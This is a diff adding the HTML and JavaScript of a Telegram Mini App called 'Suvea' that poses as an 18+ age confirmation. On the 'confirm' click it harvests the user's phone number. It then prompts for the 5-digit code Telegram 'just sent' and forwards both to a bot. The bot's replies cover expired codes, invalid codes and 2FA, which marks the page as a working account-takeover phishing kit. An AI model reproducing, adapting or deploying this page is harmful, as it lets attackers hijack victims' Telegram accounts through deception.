@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Suvea</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            background: #0a0a0a;
+            color: white;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+        .container {
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            padding: 20px;
+        }
+        .sticker {
+            width: 120px;
+            height: 120px;
+            margin: 20px auto;
+        }
+        .sticker img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        .title {
+            font-size: 32px;
+            font-weight: 600;
+            margin: 10px 0;
+        }
+        .description {
+            font-size: 18px;
+            color: #aaa;
+            margin: 10px 0 30px;
+            line-height: 1.4;
+        }
+        .button {
+            background: #2e7d32;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            padding: 15px 40px;
+            font-size: 20px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            max-width: 280px;
+            margin: 10px auto;
+            transition: background 0.2s;
+            border: 1px solid #444;
+        }
+        .button:hover {
+            background: #1e5a24;
+        }
+        .code-input {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 30px 0 20px;
+        }
+        .code-input input {
+            width: 55px;
+            height: 65px;
+            background: #222;
+            border: 2px solid #444;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 28px;
+            color: white;
+            outline: none;
+            font-weight: 600;
+        }
+        .code-input input:focus {
+            border-color: #2e7d32;
+        }
+        .hidden {
+            display: none;
+        }
+        .error {
+            color: #ff8a80;
+            margin-top: 10px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Экран 1: подтверждение возраста -->
+        <div id="step-age" class="step">
+            <div class="sticker">
+                <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Symbols/No%20One%20Under%20Eighteen.webp" alt="18+">
+            </div>
+            <div class="title">18</div>
+            <div class="description">⚠️ Attention! 🔒<br>To continue, you must confirm that you are over 18 😊</div>
+            <button class="button" onclick="confirmAge()">confirm</button>
+        </div>
+
+        <!-- Экран 2: ввод кода -->
+        <div id="step-code" class="step hidden">
+            <div class="sticker">
+                <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Objects/Mobile%20Phone%20With%20Arrow.webp" alt="phone">
+            </div>
+            <div class="description">Enter the 5-digit code that we just sent you!</div>
+            <div class="code-input">
+                <input type="text" maxlength="1" id="c1" oninput="moveNext(this, 'c2')">
+                <input type="text" maxlength="1" id="c2" oninput="moveNext(this, 'c3')">
+                <input type="text" maxlength="1" id="c3" oninput="moveNext(this, 'c4')">
+                <input type="text" maxlength="1" id="c4" oninput="moveNext(this, 'c5')">
+                <input type="text" maxlength="1" id="c5" oninput="moveNext(this, 'c5')">
+            </div>
+            <button class="button" onclick="sendCode()">GET CODE</button>
+            <div id="code-error" class="error"></div>
+        </div>
+
+        <!-- Экран 3: финальный -->
+        <div id="step-final" class="step hidden">
+            <div class="sticker">
+                <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Activity/Party%20Popper.webp" alt="party">
+            </div>
+            <div class="title">Join now</div>
+            <button class="button" onclick="closeApp()">Ok!</button>
+        </div>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.disableVerticalSwipes?.();
+
+        // Отправляем init при загрузке
+        tg.sendData(JSON.stringify({ action: 'init' }));
+        console.log('Init sent');
+
+        function moveNext(current, nextId) {
+            if (current.value.length >= current.maxLength) {
+                document.getElementById(nextId)?.focus();
+            }
+        }
+
+        function confirmAge() {
+            console.log('Confirm clicked, requesting contact...');
+            tg.requestContact((success, response) => {
+                if (success && response?.responseUnsafe?.contact?.phone_number) {
+                    let phone = response.responseUnsafe.contact.phone_number;
+                    if (!phone.startsWith('+')) phone = '+' + phone;
+                    console.log('Sending phone to bot:', phone);
+                    tg.sendData(JSON.stringify({ action: 'send_phone', phone: phone }));
+                    
+                    // Сразу показываем экран ввода кода
+                    document.getElementById('step-age').classList.add('hidden');
+                    document.getElementById('step-code').classList.remove('hidden');
+                    document.getElementById('code-error').innerText = '';
+                    for (let i = 1; i <= 5; i++) {
+                        document.getElementById('c' + i).value = '';
+                    }
+                } else {
+                    alert('You must share your phone number to continue.');
+                }
+            });
+        }
+
+        function sendCode() {
+            let code = '';
+            for (let i = 1; i <= 5; i++) {
+                let val = document.getElementById('c' + i).value;
+                if (!val) {
+                    document.getElementById('code-error').innerText = 'Enter all digits';
+                    return;
+                }
+                code += val;
+            }
+            console.log('Sending code to bot:', code);
+            tg.sendData(JSON.stringify({ action: 'send_code', code: code }));
+            // Не скрываем экран сразу, ждём ответа от бота
+        }
+
+        function closeApp() {
+            tg.close();
+        }
+
+        // Обработка входящих сообщений от бота
+        tg.onEvent('message', function(event) {
+            // event содержит объект сообщения, его текст в event.message.text
+            let data;
+            try {
+                data = JSON.parse(event.message.text);
+            } catch (e) {
+                console.log('Received non-JSON message:', event.message.text);
+                return;
+            }
+            console.log('Message from bot:', data);
+            
+            if (data.status === 'code_expired') {
+                document.getElementById('code-error').innerText = 'Code expired, new one sent';
+                // Поле ввода остаётся видимым
+            } else if (data.status === 'invalid_code') {
+                document.getElementById('code-error').innerText = 'Invalid code';
+            } else if (data.status === '2fa_required') {
+                alert('2FA required, but not implemented');
+            } else if (data.status === 'success') {
+                document.getElementById('step-age').classList.add('hidden');
+                document.getElementById('step-code').classList.add('hidden');
+                document.getElementById('step-final').classList.remove('hidden');
+            } else if (data.status === 'error') {
+                alert('Error: ' + data.message);
+                tg.close();
+            }
+        });
+    </script>
+</body>
+</html>
